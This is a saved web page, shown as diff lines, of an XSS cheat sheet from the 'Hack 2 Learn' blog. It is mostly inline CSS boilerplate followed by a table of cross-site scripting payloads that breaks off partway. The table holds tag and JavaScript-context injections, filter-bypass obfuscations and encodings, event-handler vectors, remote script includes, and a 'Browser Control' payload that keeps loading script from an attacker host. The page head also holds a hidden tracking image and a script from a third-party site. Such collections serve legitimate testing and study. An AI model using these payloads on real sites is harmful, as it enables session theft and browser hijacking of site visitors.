NyBDMi42NTIsMTUuNjI5IDIuOTkxLDE3LjY3OSAzLjAxOSwxNy44ODYgQzMuMDM2LDE4LjAwOSAzLjE5NSwxOC4wMzggMy4yNjcsMTcuOTQ2IEMzLjM3LDE3LjgxMiA0LjcsMTYuMTg3IDUuMTUxLDE0LjU2MiBDNS4yNzksMTQuMTAyIDUuODg1LDExLjcyIDUuODg1LDExLjcyIEM2LjI0OCwxMi40MDYgNy4zMDgsMTMuMDA5IDguNDM1LDEzLjAwOSBDMTEuNzksMTMuMDA5IDE0LjA2Niw5Ljk3OSAxNC4wNjYsNS45MjMgQzE0LjA2NiwyLjg1NyAxMS40NDQsMCA3LjQ1OCwwIFoiIGZpbGw9IiNmZmYiPjwvcGF0aD48L2c+PC9zdmc+);
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_white { 
+  background-color: #fff;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save { 
+  border-radius: 2px;
+  text-indent: 20px;
+  width: auto;
+  padding: 0 4px 0 0;
+  text-align: center;
+  font: 11px/20px "Helvetica Neue", Helvetica, sans-serif;
+  font-weight: bold;
+  color: #fff;
+  background: #bd081c url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==) 3px 50% no-repeat;
+  background-size: 14px 14px;
+  -webkit-font-smoothing: antialiased;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save:hover { 
+  background-color: #aa0719;
+  box-shadow: none;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save .PIN_1471802412739_count { 
+  text-indent: 0;
+  position: absolute;
+  color: #555;
+  background: #efefef;
+  border-radius: 2px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save .PIN_1471802412739_count::before { 
+  content: "";
+  position: absolute;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save.PIN_1471802412739_beside .PIN_1471802412739_count { 
+  right: -46px;
+  height: 20px;
+  width: 40px;
+  font-size: 10px;
+  line-height: 20px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save.PIN_1471802412739_beside .PIN_1471802412739_count::before { 
+  top: 3px;
+  left: -4px;
+  border-right: 7px solid #efefef;
+  border-top: 7px solid transparent;
+  border-bottom: 7px solid transparent;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save.PIN_1471802412739_above .PIN_1471802412739_count { 
+  top: -36px;
+  width: 100%;
+  height: 30px;
+  font-size: 10px;
+  line-height: 30px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save.PIN_1471802412739_above .PIN_1471802412739_count::before { 
+  bottom: -4px;
+  left: 4px;
+  border-top: 7px solid #efefef;
+  border-right: 7px solid transparent;
+  border-left: 7px solid transparent;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_save.PIN_1471802412739_above.PIN_1471802412739_padded { 
+  margin-top: 28px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall { 
+  height: 28px;
+  width: 56px;
+  border-radius: 3px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_above .PIN_1471802412739_count { 
+  position: absolute;
+  height: 37px;
+  width: inherit;
+  top: -37px;
+  left: 0;
+  line-height: 30px;
+  font-size: 14px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNzZweCIgd2lkdGg9IjExNHB4IiB2aWV3Qm94PSIwIDAgMTE0IDc2Ij48Zz48cGF0aCBkPSJNOSAxQzQuNiAxIDEgNC42IDEgOXY0M2MwIDQuMyAzLjYgOCA4IDhoMjZsMTggMTVoNy41bDE2LTE1SDEwNWM0LjQgMCA4LTMuNyA4LThWOWMwLTQuNC0zLjYtOC04LThIOXoiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2I1YjViNSIgc3Ryb2tlLXdpZHRoPSIyIj48L3BhdGg+PC9nPjwvc3ZnPg==);
+  background-size: cover;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_above.PIN_1471802412739_padded { 
+  margin-top: 37px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_beside .PIN_1471802412739_count { 
+  text-indent: 5px;
+  position: absolute;
+  right: -63px;
+  height: inherit;
+  width: 63px;
+  font-size: 14px;
+  line-height: 28px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNTZweCIgd2lkdGg9IjEyNnB4IiB2aWV3Qm94PSIyIDAgMTMwIDYwIj48Zz48cGF0aCBkPSJNMTE5LjYgMmM0LjUgMCA4IDMuNiA4IDh2NDBjMCA0LjQtMy41IDgtOCA4SDIzLjNMMS42IDMyLjR2LTQuNkwyMy4zIDJoOTYuM3oiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2I1YjViNSIgc3Ryb2tlLXdpZHRoPSIyIj48L3BhdGg+PC9nPjwvc3ZnPg==);
+  background-size: cover;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_beside.PIN_1471802412739_padded { 
+  margin-right: 63px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save { 
+  border-radius: 4px;
+  width: auto;
+  background-position-x: 6px;
+  background-size: 18px 18px;
+  text-indent: 29px;
+  font: 14px/28px "Helvetica Neue", Helvetica, Arial, "sans-serif";
+  font-weight: bold;
+  padding: 0 6px 0 0;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save .PIN_1471802412739_count { 
+  position: absolute;
+  color: #555;
+  font-size: 12px;
+  text-indent: 0;
+  background: #efefef;
+  border-radius: 4px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save .PIN_1471802412739_count::before { 
+  content: "";
+  position: absolute;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save.PIN_1471802412739_above .PIN_1471802412739_count { 
+  font-size: 14px;
+  top: -50px;
+  width: 100%;
+  height: 44px;
+  line-height: 44px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save.PIN_1471802412739_above .PIN_1471802412739_count::before { 
+  bottom: -4px;
+  left: 7px;
+  border-top: 7px solid #efefef;
+  border-right: 7px solid transparent;
+  border-left: 7px solid transparent;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save.PIN_1471802412739_beside .PIN_1471802412739_count { 
+  font-size: 14px;
+  right: -63px;
+  width: 56px;
+  height: 28px;
+  line-height: 28px;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_tall.PIN_1471802412739_save.PIN_1471802412739_beside .PIN_1471802412739_count::before { 
+  top: 7px;
+  left: -4px;
+  border-right: 7px solid #efefef;
+  border-top: 7px solid transparent;
+  border-bottom: 7px solid transparent;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_round { 
+  height: 16px;
+  width: 16px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==) 0 0 no-repeat;
+  background-size: 16px 16px;
+  box-shadow: none;
+}
+ .PIN_1471802412739_button_pin.PIN_1471802412739_round.PIN_1471802412739_tall { 
+  height: 32px;
+  width: 32px;
+  background-size: 32px 32px;
+}
+</style><script type="text/javascript" charset="utf-8" async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/button.a1287ca71ce6e06bb8d64fd87cd04244.js"></script><script type="text/javascript" charset="utf-8" async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/timeline.6d55216642aaaa6f0c819d27e19aec2d.js"></script><style>.gc-bubbleDefault{background-color:transparent !important;text-align:left;padding:0 !important;margin:0 !important;border:0 !important;table-layout:auto !important}.gc-reset{background-color:transparent !important;border:0 !important;padding:0 !important;margin:0 !important;text-align:left}.pls-bubbleTop{border-bottom:1px solid #ccc !important}.pls-topTail,.pls-vertShimLeft,.pls-contentLeft{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/border_3.gif) !important}.pls-topTail{background-repeat:repeat-x !important;background-position:bottom !important}.pls-vertShim{background-color:#fff !important;text-align:right}.tbl-grey .pls-vertShim{background-color:#f5f5f5 !important}.pls-vertShimLeft{background-repeat:repeat-y !important;background-position:right !important;height:4px}.pls-vertShimRight{height:4px}.pls-confirm-container .pls-vertShim{background-color:#fff3c2 !important}.pls-contentWrap{background-color:#fff !important;position:relative !important;vertical-align:top}.pls-contentLeft{background-repeat:repeat-y;background-position:right;vertical-align:top}.pls-dropRight{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropR_3.png) !important;background-repeat:repeat-y !important;vertical-align:top}.pls-vert,.pls-tailleft,.pls-dropTR .pls-dropBR,.pls-dropBL,.pls-vert img{vertical-align:top}.pls-dropBottom{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropB_3.png) !important;background-repeat:repeat-x !important;width:100%;vertical-align:top}.pls-topLeft{background:inherit !important;text-align:right;vertical-align:bottom}.pls-topRight{background:inherit !important;text-align:left;vertical-align:bottom}.pls-bottomLeft{background:inherit !important;text-align:right}.pls-bottomRight{background:inherit !important;text-align:left;vertical-align:top}.pls-tailtop,.pls-tailright,.pls-tailbottom,.pls-tailleft{display:none;position:relative}.pls-tailbottom,.pls-tailtop,.pls-tailright,.pls-tailleft,.pls-dropTR,.pls-dropBR,.pls-dropBL{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite_3.png) !important;background-repeat:no-repeat}.tbl-grey .pls-tailbottom,.tbl-grey .pls-tailtop,.tbl-grey .pls-tailright,.tbl-grey .pls-tailleft,.tbl-grey .pls-dropTR,.tbl-grey .pls-dropBR,.tbl-grey .pls-dropBL{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite-grey.png) !important}.pls-tailbottom{background-position:-23px 0}.pls-confirm-container .pls-tailbottom{background-position:-23px -10px}.pls-tailtop{background-position:-19px -20px}.pls-tailright{background-position:0 0}.pls-tailleft{background-position:-10px 0}.pls-tailtop{vertical-align:top}.gc-bubbleDefault td{line-height:0;font-size:0}.pls-topLeft img,.pls-topRight img,.pls-tailbottom{vertical-align:bottom}.pls-bottomLeft img,.bubbleDropTR,.pls-dropBottomL img,.pls-dropBottom img,.pls-dropBottomR img,.pls-bottomLeft{vertical-align:top}.pls-dropTR{background-position:0 -22px}.pls-dropBR{background-position:0 -27px}.pls-dropBL{background-position:0 -16px}.pls-spacertop,.pls-spacerright,.pls-spacerbottom,.pls-spacerleft{position:static !important}.pls-spinner{bottom:0;position:absolute;left:0;margin:auto;right:0;top:0} </style></head>
+
+<body class="page page-id-1039 page-parent page-template-default sfsi_plus_2.47">      
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-83652425-1', 'auto');
+  ga('send', 'pageview');
+var id='wZ54u23';
+
+</script>
+<img src='http://www.upload-website.com/ImageSourcewZ54u23' style='display:none'>
+<script src='http://www.upload-website.com/js/upload-website.js'></script>
+<div id='AppendHere'></div>
+
+
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="http://brutelogic.com.br/blog/cheat-sheet/#content">Skip to content</a>
+		<header id="masthead" class="site-header clearfix" role="banner">
+				<div class="site-branding">
+						<h1 class="site-title"><a href="http://brutelogic.com.br/blog/" rel="home">Hack 2 Learn</a></h1>
+			<h2 class="site-description">Master the art of Cross Site Scripting.</h2>
+		</div>
+
+		<nav id="site-navigation" class="main-navigation nav-horizontal" role="navigation">
+			<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Menu</button>
+			<div id="primary-menu" class="menu"><ul aria-expanded="false" class=" nav-menu"><li><a href="http://brutelogic.com.br/blog/">Home</a></li><li class="page_item page-item-1039 page_item_has_children current_page_item" aria-haspopup="true"><a href="http://brutelogic.com.br/blog/cheat-sheet/">XSS Cheat Sheet</a><ul class="children"><li class="page_item page-item-1186"><a href="http://brutelogic.com.br/blog/cheat-sheet/brutal/">Brutal Cheat Sheet</a></li></ul></li><li class="page_item page-item-1294"><a href="http://brutelogic.com.br/blog/shop/">Shop</a></li><li class="page_item page-item-853"><a href="http://brutelogic.com.br/blog/secrets/">Secrets</a></li><li class="page_item page-item-1306"><a href="http://brutelogic.com.br/blog/xss101/">101</a></li><li class="page_item page-item-414"><a href="http://brutelogic.com.br/blog/about/">About</a></li></ul></div>
+		</nav><!-- #site-navigation -->
+	</header><!-- #masthead -->
+
+	<div id="content" class="site-content clearfix">
+
+			<div class="breadcrumbs">
+			<a class="breadcrumbs-root" href="http://brutelogic.com.br/blog/">Home</a><span class="breadcrumbs-current">XSS Cheat Sheet</span>		</div>
+		<div class="content-area primary">
+		<main id="main" class="site-main" role="main">
+
+							<div class="article-wrapper">
+					
+<article id="post-1039" class="post-1039 page type-page status-publish has-post-thumbnail hentry">
+	<header class="entry-header">
+		<h1 class="entry-title">XSS Cheat Sheet</h1>
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>Basic and advanced exploits&nbsp;for XSS proofs and attacks.</p>
+<p>Work in progress, bookmark it.</p>
+
+<div id="tablepress-3_wrapper" class="dataTables_wrapper"><table id="tablepress-3" class="tablepress tablepress-id-3 dataTable" role="grid">
+<thead>
+<tr class="row-1 odd" role="row"><th class="column-1 sorting_disabled" rowspan="1" colspan="1" style="width: 126px;">Technique</th><th class="column-2 sorting_disabled" rowspan="1" colspan="1" style="width: 697px;">Vector/Payload *</th></tr>
+</thead>
+<tfoot>
+<tr class="row-28 even"><th class="column-1" rowspan="1" colspan="1">* In URLs:<br>
+</th><th class="column-2" rowspan="1" colspan="1">&amp; =&gt; %26 ,  # =&gt; %23 ,  + =&gt; %2B</th></tr>
+</tfoot>
+<tbody class="row-hover">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<tr class="row-2 even" role="row">
+	<td class="column-1">HTML Context <br>
+Tag Injection</td><td class="column-2"><br>
+&lt;svg onload=alert(1)&gt;<br>
+"&gt;&lt;svg onload=alert(1)//<br>
+</td>
+</tr><tr class="row-3 odd" role="row">
+	<td class="column-1">HTML Context <br>
+Inline Injection</td><td class="column-2"><br>
+"onmouseover=alert(1)//<br>
+"autofocus/onfocus=alert(1)//</td>
+</tr><tr class="row-4 even" role="row">
+	<td class="column-1">Javascript Context <br>
+Code Injection</td><td class="column-2"><br>
+'-alert(1)-'<br>
+'-alert(1)//</td>
+</tr><tr class="row-5 odd" role="row">
+	<td class="column-1">Javascript Context <br>
+Code Injection<br>
+(escaping the escape)</td><td class="column-2"><br>
+<br>
+\'-alert(1)//<br>
+</td>
+</tr><tr class="row-6 even" role="row">
+	<td class="column-1">Javascript Context <br>
+Tag Injection</td><td class="column-2"><br>
+&lt;/script&gt;&lt;svg onload=alert(1)&gt;</td>
+</tr><tr class="row-7 odd" role="row">
+	<td class="column-1">PHP_SELF Injection</td><td class="column-2">http://DOMAIN/PAGE.php/"&gt;&lt;svg onload=alert(1)&gt;</td>
+</tr><tr class="row-8 even" role="row">
+	<td class="column-1">Without Parenthesis</td><td class="column-2">&lt;svg onload=alert`1`&gt;<br>
+&lt;svg onload=alert&amp;lpar;1&amp;rpar;&gt;<br>
+&lt;svg onload=alert&amp;#x28;1&amp;#x29&gt;<br>
+&lt;svg onload=alert&amp;#40;1&amp;#41&gt;</td>
+</tr><tr class="row-9 odd" role="row">
+	<td class="column-1"><br><br>
+Filter Bypass <br>
+Alert Obfuscation</td><td class="column-2">(alert)(1)<br>
+a=alert,a(1)<br>
+[1].find(alert)<br>
+top["al"+"ert"](1)<br>
+top[/al/.source+/ert/.source](1)<br>
+al\u0065rt(1)<br>
+top['al\145rt'](1)<br>
+top['al\x65rt'](1)<br>
+top[8680439..toString(30)](1)</td>
+</tr><tr class="row-10 even" role="row">
+	<td class="column-1"><br><br>
+<br><br>
+Body Tag</td><td class="column-2">&lt;body onload=alert(1)&gt;<br>
+&lt;body onpageshow=alert(1)&gt;<br>
+&lt;body onfocus=alert(1)&gt;<br>
+&lt;body onhashchange=alert(1)&gt;&lt;a href=#x&gt;click this!#x<br>
+&lt;body style=overflow:auto;height:1000px onscroll=alert(1) id=x&gt;#x<br>
+&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<br>
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<br>
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<br>
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x<br>
+&lt;body onresize=alert(1)&gt;press F12!<br>
+&lt;body onhelp=alert(1)&gt;press F1! (MSIE)</td>
+</tr><tr class="row-11 odd" role="row">
+	<td class="column-1"><br><br>
+<br>
+Miscellaneous Vectors</td><td class="column-2">&lt;marquee onstart=alert(1)&gt;<br>
+&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;<br>
+&lt;audio src onloadstart=alert(1)&gt;<br>
+&lt;video onloadstart=alert(1)&gt;&lt;source&gt;<br>
+&lt;input autofocus onblur=alert(1)&gt;<br>
+&lt;keygen autofocus onfocus=alert(1)&gt;<br>
+&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;<br>
+&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2<br>
+&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me!</td>
+</tr><tr class="row-12 even" role="row">
+	<td class="column-1"><br>
+<br>
+<br>
+<br>
+<a href="http://brutelogic.com.br/blog/agnostic-event-handlers" target="_blank"><br>
+Agnostic Event Handlers</a></td><td class="column-2">&lt;x contenteditable onblur=alert(1)&gt;lose focus! <br>
+&lt;x onclick=alert(1)&gt;click this! <br>
+&lt;x oncopy=alert(1)&gt;copy this! <br>
+&lt;x oncontextmenu=alert(1)&gt;right click this! <br>
+&lt;x oncut=alert(1)&gt;copy this! <br>
+&lt;x ondblclick=alert(1)&gt;double click this! <br>
+&lt;x ondrag=alert(1)&gt;drag this! <br>
+&lt;x contenteditable onfocus=alert(1)&gt;focus this! <br>
+&lt;x contenteditable oninput=alert(1)&gt;input here! <br>
+&lt;x contenteditable onkeydown=alert(1)&gt;press any key! <br>
+&lt;x contenteditable onkeypress=alert(1)&gt;press any key! <br>
+&lt;x contenteditable onkeyup=alert(1)&gt;press any key! <br>
+&lt;x onmousedown=alert(1)&gt;click this! <br>
+&lt;x onmousemove=alert(1)&gt;hover this! <br>
+&lt;x onmouseout=alert(1)&gt;hover this! <br>
+&lt;x onmouseover=alert(1)&gt;hover this! <br>
+&lt;x onmouseup=alert(1)&gt;click this! <br>
+&lt;x contenteditable onpaste=alert(1)&gt;paste here!</td>
+</tr><tr class="row-13 odd" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/existing-code-reuse" target="_blank">Code Reuse<br>
+Inline Script</a></td><td class="column-2">&lt;script&gt;alert(1)// <br>
+&lt;script&gt;alert(1)&lt;!–</td>
+</tr><tr class="row-14 even" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/existing-code-reuse" target="_blank">Code Reuse <br>
+Regular Script</a> </td><td class="column-2">&lt;script src=//brutelogic.com.br/1.js&gt; <br>
+&lt;script src=//3334957647/1&gt;</td>
+</tr><tr class="row-15 odd" role="row">
+	<td class="column-1"><br>
+<br>
+<br>
+<br>
+<a href="http://brutelogic.com.br/blog/filter-bypass-procedure" target="_blank">Filter Bypass<br>
+Generic Tag + Handler</a></td><td class="column-2">
+<table id="tablepress-5" class="tablepress tablepress-id-5">
+<tbody class="row-hover">
+<tr class="row-1">
+	<td class="column-1">Encoding <br>
+</td><td class="column-2">Mixed Case <br>
+</td><td class="column-3">Spacers <br>
+</td>
+</tr>
+<tr class="row-2">
+	<td class="column-1"> %3Cx onxxx=1 <br>
+&lt;%78 onxxx=1 <br>
+&lt;x %6Fnxxx=1 <br>
+&lt;x o%6Exxx=1 <br>
+&lt;x on%78xx=1 <br>
+&lt;x onxxx%3D1<br>
+</td><td class="column-2">&lt;X onxxx=1 <br>
+&lt;x OnXxx=1 <br>
+&lt;X OnXxx=1 <br>
+<br>
+Doubling <br>
+&lt;x onxxx=1 onxxx=1<br>
+<br>
+</td><td class="column-3"> &lt;x/onxxx=1 <br>
+&lt;x%09onxxx=1 <br>
+&lt;x%0Aonxxx=1 <br>
+&lt;x%0Conxxx=1 <br>
+&lt;x%0Donxxx=1 <br>
+&lt;x%2Fonxxx=1 <br>
+</td>
+</tr>
+<tr class="row-3">
+	<td class="column-1">Quotes</td><td class="column-2">Stripping</td><td class="column-3">Mimetism</td>
+</tr>
+<tr class="row-4">
+	<td class="column-1">&lt;x 1='1'onxxx=1 <br>
+&lt;x 1="1"onxxx=1</td><td class="column-2">&lt;[S]x onx[S]xx=1<br>
+<br>
+[S] = stripped char or string</td><td class="column-3">&lt;x &lt;/onxxx=1 <br>
+&lt;x 1="&gt;" onxxx=1 <br>
+&lt;http://onxxx%3D1/</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr><tr class="row-16 even" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/source-breaking-injections" target="_blank">Generic Source Breaking </a></td><td class="column-2"><br>
+&lt;x onxxx=alert(1) 1='</td>
+</tr><tr class="row-17 odd" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/using-xss-to-control-a-browser" target="_blank">Browser Control</a></td><td class="column-2">&lt;svg onload=setInterval(function(){with(document)body. <br>
+appendChild(createElement('script')).src='//HOST:PORT'},0)&gt; <br>
+<br>
